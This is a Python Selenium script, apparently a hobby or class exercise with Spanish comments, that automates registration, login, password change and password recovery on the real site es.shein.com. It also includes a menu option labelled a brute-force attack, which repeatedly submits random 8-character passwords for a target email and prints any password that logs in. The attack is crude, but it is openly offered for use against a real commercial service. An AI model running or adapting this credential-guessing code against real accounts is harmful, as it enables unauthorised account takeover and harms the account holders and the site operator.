import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver import ActionChains

import string
import random

# Generar contraseñas

password_characters = string.ascii_letters + string.digits + string.punctuation

def get_random_string(length):
    random_pw = ''.join(random.choice(password_characters) for i in range(length))

    return random_pw


# Información de registro
email = ''
password = '' #min 8 , max 27560, al menos una letra, al menos 1 número
new_password = ''


# Cambiar ruta del controlador para el navegador Firefox
PATH = r'C:\Program Files (x86)\geckodriver.exe'

driver = webdriver.Firefox(executable_path=PATH)

def register_shein():
    driver.get("https://es.shein.com/")
    driver.maximize_window()

    time.sleep(3)

    try:
        close_pop_up = driver.find_element_by_xpath('/html/body/div[1]/div[5]/div[1]/div/div/i')
        close_pop_up.click()
    except:
        print("No pop-up")
    else:
        print("Pop-up closed")

    account_button = driver.find_element_by_xpath('/html/body/div[1]/header/div[2]/div[1]/div/div[1]/div/div[3]/div[1]')
    account_button.click()

    time.sleep(1)

    email_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[3]/div/form/div[1]/input')
    email_field.send_keys(email)

    password_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[3]/div/form/div[2]/input')
    password_field.send_keys(password)

    password_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[3]/div/form/div[4]/input')
    password_field.send_keys(password)

    register_btn = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[3]/div/button[1]')
    register_btn.click()

    return

def login_shein():

    driver.get("https://es.shein.com/")
    driver.maximize_window()

    time.sleep(3)

    try:
        close_pop_up = driver.find_element_by_xpath('/html/body/div[1]/div[5]/div[1]/div/div/i')
        close_pop_up.click()
    except:
        print("No pop-up")
    else:
        print("Pop-up closed")

    account_button = driver.find_element_by_xpath('/html/body/div[1]/header/div[2]/div[1]/div/div[1]/div/div[3]/div[1]')
    account_button.click()

    time.sleep(1)

    email_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/form/div[1]/input')
    email_field.send_keys(email)

    password_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/form/div[2]/input')
    password_field.send_keys(password)

    login_btn = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/div[2]/button[1]')
    login_btn.click()

    return

def pw_change_shein():

    driver.get("https://es.shein.com/")
    driver.maximize_window()

    time.sleep(3)

    try:
        close_pop_up = driver.find_element_by_xpath('/html/body/div[1]/div[5]/div[1]/div/div/i')
        close_pop_up.click()
    except:
        print("No pop-up")
    else:
        print("Pop-up closed")

    account_button = driver.find_element_by_xpath('/html/body/div[1]/header/div[2]/div[1]/div/div[1]/div/div[3]/div[1]')
    account_button.click()

    time.sleep(1)

    email_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/form/div[1]/input')
    email_field.send_keys(email)

    password_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/form/div[2]/input')
    password_field.send_keys(password)

    login_btn = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/div[2]/button[1]')
    login_btn.click()

    time.sleep(5)

    security_page = driver.find_element_by_xpath('/html/body/div[1]/div[1]/div/div[1]/div/div[1]/div/ul/li[6]')
    security_page.click()

    old_pw_field = driver.find_element_by_xpath('/html/body/div[1]/div[1]/div/div[2]/div/div[3]/div[1]/input')
    old_pw_field.send_keys(password)

    new_pw_field = driver.find_element_by_xpath('/html/body/div[1]/div[1]/div/div[2]/div/div[3]/div[2]/input')
    new_pw_field.send_keys(new_password)

    new_pw_field_2 = driver.find_element_by_xpath('/html/body/div[1]/div[1]/div/div[2]/div/div[3]/div[4]/input')
    new_pw_field_2.send_keys(new_password)

    save_btn = driver.find_element_by_xpath('/html/body/div[1]/div[1]/div/div[2]/div/div[3]/div[5]/button[1]')
    save_btn.click()

    return
 
def restore_pw_shein():

    driver.get("https://es.shein.com/")
    driver.maximize_window()

    time.sleep(3)

    try:
        close_pop_up = driver.find_element_by_xpath('/html/body/div[1]/div[5]/div[1]/div/div/i')
        close_pop_up.click()
    except:
        print("No pop-up")
    else:
        print("Pop-up closed")

    account_button = driver.find_element_by_xpath('/html/body/div[1]/header/div[2]/div[1]/div/div[1]/div/div[3]/div[1]')
    account_button.click()

    time.sleep(1)

    forgot_pw = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/div[2]/div[1]/a')
    forgot_pw.click()


    email_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[1]/div[1]/div/div/input')
    email_field.send_keys(email)

    continue_btn = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[1]/div[1]/div/button[2]')
    continue_btn.click()

    return

def brute_force(n, driver):
    while n != 0:

        driver.get("https://es.shein.com/")
        driver.maximize_window()
        password_rand = get_random_string(8)
        time.sleep(3)

        try:
            close_pop_up = driver.find_element_by_xpath('/html/body/div[1]/div[5]/div[1]/div/div/i')
            close_pop_up.click()
        except:
            print("No pop-up")
        else:
            print("Pop-up closed")

        account_button = driver.find_element_by_xpath('/html/body/div[1]/header/div[2]/div[1]/div/div[1]/div/div[3]/div[1]')
        account_button.click()

        time.sleep(1)

        email_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/form/div[1]/input')
        email_field.send_keys(email)

        password_field = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/form/div[2]/input')
        password_field.send_keys(password_rand) 

        login_btn = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/div[2]/button[1]')
        login_btn.click()


        time.sleep(3)

        account_button = driver.find_element_by_xpath('/html/body/div[1]/header/div[2]/div[1]/div/div[1]/div/div[3]/div[1]')
        account_button.click()

        n = n - 1
        element = ""
        try:
            element = driver.find_element_by_xpath("/html/body/div[1]/div[2]/div/div/div[2]/div[1]/div[1]/div/h4").text
        except:
            pass

        if element == "Identifícate":
            print("Contraseña incorrecta")
        else:
            print("contraseña encontrada: ")
            print(password_rand)
            n = 0

    driver.close()


print("1.- Registro")
print("2.- Iniciar sesión")
print("3.- Cambiar contraseña")
print("4.- Recuperar contraseña")
print("5.- Ataque fuerza bruta")

print("Seleccione la opción que desea: ")

a = input()



if a == "1":
    register_shein()
elif a == "2":
    login_shein()
elif a == "3":
    pw_change_shein()
elif a == "4":
    restore_pw_shein()

elif a == "5":
    brute_force(100, driver)
else:
    print("Opción no válida.")




